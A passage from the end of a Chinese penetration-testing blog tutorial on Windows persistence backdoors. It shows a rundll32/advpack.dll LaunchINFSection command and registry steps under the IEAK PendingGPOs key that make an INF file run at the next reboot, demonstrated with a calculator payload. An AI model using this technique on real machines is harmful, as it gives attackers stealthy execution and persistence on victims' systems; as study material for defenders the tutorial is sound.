<pre><code class="hljs css"><span class="hljs-selector-tag">rundll32</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">advpack</span><span class="hljs-selector-class">.dll</span>,<span class="hljs-selector-tag">LaunchINFSection</span> <span class="hljs-selector-tag">calc</span><span class="hljs-selector-class">.inf</span>,<span class="hljs-selector-tag">DefaultInstall</span></code></pre>

<p>效果如下：<br><img src="/img/wz/nw/n50.gif" srcset="/img/loading.gif" alt="n50"></p>
<p>后门实现：<br>在注册表<code>HKEY_CURRENT_USER\Software\Microsoft\</code>处依次新建子项<code>\IEAK\GroupPolicy\PendingGPOs</code>，然后再新建几个键，如下：</p>
<ol>
<li>键：<code>Count</code>，类型：<code>REG_DWORD</code>，键值：<code>1</code></li>
<li>键：<code>Path1</code>，类型：<code>REG_SZ</code>，键值：<code>C:\Users\Administrator\Desktop\test\calc.inf</code> //这个为我们inf文件的路径，这里以上面那个inf文件例子为例</li>
<li>键：<code>Section1</code>，类型：<code>REG_SZ</code>，键值：<code>DefaultInstall</code></li>
</ol>
<p>如下图所示：<br><img src="/img/wz/nw/n51.png" srcset="/img/loading.gif" alt="n51"></p>
<p>重启电脑之后成功弹出计算器</p>
<p><img src="/img/wz/nw/n52.gif" srcset="/img/loading.gif" alt="n52"></p>
<p>但是重启之后<code>PendingGPOs</code>该项就会被清除，需要我们重新修改注册表</p>
<p><img src="/img/wz/nw/n53.png" srcset="/img/loading.gif" alt="n53"></p>
<p><code>仅供学习参考，请勿用于非法用途！</code></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://mp.weixin.qq.com/s/uXnPctlOBmciHM4Q-7oquw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/uXnPctlOBmciHM4Q-7oquw</a>
<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://mp.weixin.qq.com/s/pz6y8299gMUOgtZjZv5puw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/pz6y8299gMUOgtZjZv5puw</a>
<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://mp.weixin.qq.com/s/Qs_JS3cvqchMVUhTucqZ9Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Qs_JS3cvqchMVUhTucqZ9Q</a>
<a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>
            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E6%95%99%E7%A8%8B/">教程</a>
                    
                      <a class="hover-with-bg" href="/categories/%E6%95%99%E7%A8%8B/%E6%B8%97%E9%80%8F/">渗透</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/%E6%95%99%E7%A8%8B/">教程</a>
                    
                      <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F/">渗透</a>
                    
                      <a class="hover-with-bg" href="/tags/shell/">shell</a>
                    
                      <a class="hover-with-bg" href="/tags/Linux/">Linux</a>
                    
                      <a class="hover-with-bg" href="/tags/%E5%90%8E%E9%97%A8/">后门</a>
                    
                      <a class="hover-with-bg" href="/tags/Windows/">Windows</a>
                    
                  </div>
                
              </div>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/08/18/iis%E7%9F%AD%E6%96%87%E4%BB%B6/">
                        <span class="hidden-mobile">IIS短文件文件夹漏洞</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments">
                
                
  <div id="vcomments"></div>
  <script type="text/javascript">
    function loadValine() {
      addScript('https://cdn.staticfile.org/valine/1.4.14/Valine.min.js', function () {
        new Valine({
          el: "#vcomments",
          app_id: "Mt0aT3o5jO93NtJzAjcbVtTd-gzGzoHsz",
          app_key: "M7vbJxuLlDJod7LgDWDgLXjs",
          placeholder: "说点什么",
          path: window.location.pathname,
          avatar: "retro",
          meta: ["nick","mail","link"],
          pageSize: "10",
          lang: "zh-CN",
          highlight: false,
          recordIP: true,
          serverURLs: "",
        });
      });
    }
    waitElementVisible('vcomments', loadValine);
  </script>
  <noscript>Please enable JavaScript to view the <a href="https://valine.js.org" target="_blank" rel="nofollow noopener noopener">comments
      powered by Valine.</a></noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div id="tocbot"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    
  </main>

  
    <a id="scroll-top-button" href="#" role="button">
      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
    </a>
  

  
    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
  

  

  

  <footer class="mt-5">
  <div class="text-center py-3">
    <div>
      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
      <i class="iconfont icon-love"></i>
      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
        <span>Fluid</span></a>
    </div>
    
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


    

    
  </div>
</footer>

<!-- SCRIPTS -->
<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/main.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
  <script  src="/js/clipboard-use.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
  <script>
    $(document).ready(function () {
      var boardCtn = $('#board-ctn');
      var boardTop = boardCtn.offset().top;

      tocbot.init({
        tocSelector: '#tocbot',
        contentSelector: '#post-body',
        headingSelector: 'h1,h2,h3,h4,h5,h6',
        linkClass: 'tocbot-link',
        activeLinkClass: 'tocbot-active-link',
        listClass: 'tocbot-list',
        isCollapsedClass: 'tocbot-is-collapsed',
        collapsibleClass: 'tocbot-is-collapsible',
        collapseDepth: 0,
        scrollSmooth: true,
        headingsOffset: -boardTop
      });
      if ($('.toc-list-item').length > 0) {
        $('#toc').css('visibility', 'visible');
      }
    });
  </script>



  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    var typed = new Typed('#subtitle', {
      strings: [
        '  ',
        "从shell到持久化后门&nbsp;",
      ],
      cursorChar: "_",
      typeSpeed: 70,
      loop: false,
    });
    typed.stop();
    $(document).ready(function () {
      $(".typed-cursor").addClass("h2");
      typed.start();
    });
  </script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
  <script>
    anchors.options = {
      placement: "right",
      visible: "hover",
      
    };
    var el = "h1,h2,h3,h4,h5,h6".split(",");
    var res = [];
    for (item of el) {
      res.push(".markdown-body > " + item)
    }
    anchors.add(res.join(", "))
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    var path = "/local-search.xml";
    var inputArea = document.querySelector("#local-search-input");
    inputArea.onclick = function () {
      searchFunc(path, 'local-search-input', 'local-search-result');
      this.onclick = null
    }
  </script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />

  <script>
    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
      function () {
        var element = document.createElement('a');
        $(element).attr('data-fancybox', 'images');
        $(element).attr('href', $(this).attr('src'));
        $(this).wrap(element);
      }
    );
  </script>




















</body>
</html>
